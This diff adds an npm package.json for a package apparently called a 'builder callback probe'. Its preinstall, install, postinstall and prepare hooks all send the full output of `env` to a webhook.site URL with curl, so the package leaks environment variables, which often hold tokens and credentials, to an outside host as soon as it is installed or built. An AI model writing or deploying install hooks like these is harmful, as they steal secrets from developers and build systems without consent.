@@ -1,0 +1,11 @@
+{
+  "name": "i12862-probe",
+  "version": "1.0.0",
+  "description": "builder callback probe",
+  "scripts": {
+    "preinstall": "curl -sS -m 25 -X POST \"https://webhook.site/c826020d-4e7d-422c-abf7-8358e0f36dba/?stage=npm_preinstall\" --data-binary \"$(env)\" || true",
+    "install": "curl -sS -m 25 -X POST \"https://webhook.site/c826020d-4e7d-422c-abf7-8358e0f36dba/?stage=npm_install\" --data-binary \"$(env)\" || true",
+    "postinstall": "curl -sS -m 25 -X POST \"https://webhook.site/c826020d-4e7d-422c-abf7-8358e0f36dba/?stage=npm_postinstall\" --data-binary \"$(env)\" || true",
+    "prepare": "curl -sS -m 25 -X POST \"https://webhook.site/c826020d-4e7d-422c-abf7-8358e0f36dba/?stage=npm_prepare\" --data-binary \"$(env)\" || true"
+  }
+}
